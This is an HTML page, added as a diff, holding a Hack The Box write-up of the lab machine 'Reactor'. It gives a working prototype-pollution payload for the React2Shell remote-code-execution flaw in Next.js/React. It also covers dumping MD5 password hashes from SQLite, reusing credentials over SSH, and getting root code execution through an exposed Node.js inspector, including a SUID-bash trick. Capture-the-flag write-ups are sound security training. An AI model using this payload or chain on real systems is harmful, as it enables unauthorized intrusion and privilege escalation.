@@ -1,0 +1,203 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Reactor — HTB Writeup · Arthur Trapp</title>
+<meta name="description" content="React2Shell RCE (CVE-2025-55182) → SQLite creds → SSH → Node.js inspector root" />
+<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Crect width='32' height='32' rx='6' fill='%232c3b4d'/%3E%3Ctext x='16' y='23' font-family='monospace' font-size='18' fill='%23f79c42' text-anchor='middle'%3E$%3C/text%3E%3C/svg%3E" />
+<link rel="preconnect" href="https://fonts.googleapis.com" />
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet" />
+<link rel="stylesheet" href="../assets/style.css" />
+</head>
+<body>
+<header>
+  <div class="wrap nav">
+    <a class="nav-brand" href="../index.html"><span class="logo">AT</span>arthur_trapp</a>
+    <nav class="nav-links" aria-label="Primary">
+      <a href="../index.html#about">about</a>
+      <a href="../index.html#projects">projects</a>
+      <a class="active" href="index.html">writeups</a>
+      <a href="../index.html#contact">contact</a>
+    </nav>
+  </div>
+</header>
+<main>
+  <div class="page-hero">
+    <div class="wrap">
+      <div class="crumb"><a href="../index.html">~</a> / <a href="index.html">writeups</a> / reactor</div>
+      <h1>Reactor</h1>
+      <p class="sub">Hack The Box · <span class="accent">Easy</span> · Linux</p>
+      <div class="meta-tags">
+        <span class="green">Easy</span>
+        <span>Linux</span>
+        <span class="accent">User + Root owned</span>
+      </div>
+    </div>
+  </div>
+  <article class="content wrap">
+<h2>Machine Overview</h2>
+<div class="table-scroll"><table>
+<thead>
+<tr>
+<th>Field</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Name</td>
+<td>Reactor</td>
+</tr>
+<tr>
+<td>Difficulty</td>
+<td>Easy</td>
+</tr>
+<tr>
+<td>OS</td>
+<td>Linux (Ubuntu 24.04.4 LTS)</td>
+</tr>
+<tr>
+<td>IP</td>
+<td>10.129.149.68</td>
+</tr>
+<tr>
+<td>Vhost</td>
+<td>reactor.htb (access via IP works directly)</td>
+</tr>
+<tr>
+<td>Kernel</td>
+<td>6.8.0-117-generic</td>
+</tr>
+<tr>
+<td>Ports</td>
+<td>22 (OpenSSH 9.6p1), 3000 (Next.js 15.0.3)</td>
+</tr>
+<tr>
+<td>Season</td>
+<td>11</td>
+</tr>
+</tbody>
+</table></div>
+<h2>Flags</h2>
+<div class="table-scroll"><table>
+<thead>
+<tr>
+<th>Flag</th>
+<th>Path</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>User</td>
+<td>/home/engineer/user.txt</td>
+<td><code>[REDACTED]</code></td>
+</tr>
+<tr>
+<td>Root</td>
+<td>/root/root.txt</td>
+<td><code>[REDACTED]</code></td>
+</tr>
+</tbody>
+</table></div>
+<h2>Reconnaissance</h2>
+<pre><code class="language-bash">nmap -p- --min-rate 5000 -T4 10.129.149.68
+# PORT     STATE SERVICE
+# 22/tcp   open  ssh
+# 3000/tcp open  ppp
+
+nmap -sCV -p 22,3000 10.129.149.68
+# 22/tcp   open  ssh   OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux)
+# 3000/tcp open  http  Next.js (X-Powered-By: Next.js, x-nextjs-cache: HIT)
+</code></pre>
+<p>The web app on 3000 is <strong>ReactorWatch</strong> — a static nuclear-reactor dashboard, no visible login.
+<code>package.json</code> revealed <code>next@15.0.3</code> + <code>react@19.0.0</code>, squarely inside the CVE-2025-55182 (React2Shell) vulnerable range.</p>
+<h2>Attack Chain</h2>
+<h3>1. Foothold — React Server Components RCE (CVE-2025-55182)</h3>
+<p>Unauthenticated RCE via the React Server Components Flight-protocol deserializer (prototype pollution).
+A crafted multipart POST with a <code>Next-Action</code> header reaches <code>process.mainModule.require('child_process').execSync</code>.
+Output is exfiltrated through the <code>NEXT_REDIRECT</code> error <code>digest</code> field.</p>
+<pre><code class="language-python">payload = {
+    &quot;then&quot;: &quot;$1:__proto__:then&quot;,
+    &quot;status&quot;: &quot;resolved_model&quot;,
+    &quot;reason&quot;: -1,
+    &quot;value&quot;: '{&quot;then&quot;: &quot;$B0&quot;}',
+    &quot;_response&quot;: {
+        &quot;_prefix&quot;: &quot;var res = process.mainModule.require('child_process')&quot;
+                   &quot;.execSync(&lt;cmd&gt;,{timeout:5000}).toString().trim(); &quot;
+                   &quot;throw Object.assign(new Error('NEXT_REDIRECT'), {digest:`${res}`});&quot;,
+        &quot;_formData&quot;: {&quot;get&quot;: &quot;$1:constructor:constructor&quot;},
+    },
+}
+# POST with files={&quot;0&quot;: json(payload), &quot;1&quot;: '&quot;$@0&quot;'}, header Next-Action: x
+</code></pre>
+<pre><code class="language-bash">python3 rce.py http://10.129.149.68:3000 &quot;id; hostname; whoami&quot;
+# uid=999(node) gid=988(node) groups=988(node)
+# reactor
+# node
+</code></pre>
+<p>Execution lands as the <code>node</code> service user.</p>
+<h3>2. Credential Harvesting — SQLite <code>reactor.db</code></h3>
+<p>The app dir <code>/opt/reactor-app/</code> holds <code>reactor.db</code> (world-readable by the <code>node</code> user) with an unsalted-MD5 <code>users</code> table:</p>
+<pre><code class="language-bash">sqlite3 /opt/reactor-app/reactor.db 'SELECT id,username,password_hash,role,email FROM users;'
+# 1|admin|a203b22191d744a4e70ada5c101b17b8|administrator|admin@reactor.htb
+# 2|engineer|39d97110eafe2a9a68639812cd271e8e|operator|engineer@reactor.htb
+</code></pre>
+<pre><code class="language-bash">echo -n reactor1 | md5sum   # 39d97110eafe2a9a68639812cd271e8e  -&gt; matches engineer
+</code></pre>
+<h3>3. User — SSH as <code>engineer</code></h3>
+<p>The cracked MD5 (<code>engineer : reactor1</code>) is reused for SSH:</p>
+<pre><code class="language-bash">ssh engineer@10.129.149.68   # password: reactor1
+id                           # uid=1000(engineer) ... groups=...,4(adm),...,101(lxd)
+cat user.txt                 # [REDACTED]
+</code></pre>
+<h3>4. Root — Node.js inspector (<code>--inspect</code>) on a root process</h3>
+<p><code>ps aux</code> reveals a root-owned Node process exposing the V8 debugger on localhost:</p>
+<pre><code class="language-bash">ps aux | grep -- --inspect
+# root 1413 ... /usr/bin/node --inspect=127.0.0.1:9229 /opt/uptime-monitor/worker.js
+</code></pre>
+<p>The debugger's Chrome DevTools Protocol endpoint is reachable from the compromised host itself
+(no SSH port-forward needed — the RCE already runs <em>on</em> the target):</p>
+<pre><code class="language-bash">curl -s http://127.0.0.1:9229/json
+# [ { &quot;title&quot;: &quot;/opt/uptime-monitor/worker.js&quot;,
+#     &quot;webSocketDebuggerUrl&quot;: &quot;ws://127.0.0.1:9229/&lt;uuid&gt;&quot;, ... } ]
+</code></pre>
+<p>Attach via a raw WebSocket and <code>Runtime.evaluate</code> a <code>child_process.execSync</code> call <em>inside the root process</em>:</p>
+<pre><code class="language-js">process.mainModule.require('child_process')
+  .execSync('cat /root/root.txt; cat /home/engineer/user.txt; id').toString()
+</code></pre>
+<pre><code class="language-bash">python3 cdp_rce.py
+# uid=0(root) gid=0(root) groups=0(root)
+# root.txt: [REDACTED]
+</code></pre>
+<p>(Equivalent, SUID-based alternative used in public writeups: <code>Runtime.evaluate</code> →
+<code>require('child_process').execSync('chmod u+s /bin/bash')</code> → <code>/bin/bash -p</code>.)</p>
+<h2>Techniques Demonstrated</h2>
+<ol>
+<li>React Server Components Flight-protocol deserialization → prototype pollution RCE (CVE-2025-55182 / React2Shell)</li>
+<li>Error-based command output exfiltration via the <code>NEXT_REDIRECT</code> error <code>digest</code> field</li>
+<li>SQLite database credential harvesting (<code>reactor.db</code>)</li>
+<li>Unsalted-MD5 hash cracking + credential reuse (app DB password == SSH password)</li>
+<li>Node.js <code>--inspect</code> V8 inspector abuse → <code>Runtime.evaluate</code> in a root process (CDP over raw WebSocket)</li>
+</ol>
+<h2>Tools Used</h2>
+<p>nmap, curl, Python (requests, paramiko, stdlib WebSocket), sqlite3, md5sum, CVE-2025-55182 PoC (react2shell).</p>
+    <a class="back-link" href="index.html">← all writeups</a>
+  </article>
+</main>
+<footer>
+  <div class="wrap footer-row">
+    <span>© 2026 Arthur Trapp · Rochester, NY</span>
+    <span class="clearance">ACTIVE TS/SCI CLEARANCE</span>
+  </div>
+</footer>
+<script>
+  const io = new IntersectionObserver((es) => {
+    es.forEach(e => { if (e.isIntersecting) { e.target.classList.add('visible'); io.unobserve(e.target); } });
+  }, { threshold: 0.1 });
+  document.querySelectorAll('.content h2, .content h3, .content p, .content pre, .content table, .content ul, .content ol, .content blockquote').forEach(el => io.observe(el));
+</script>
+</body>
+</html>
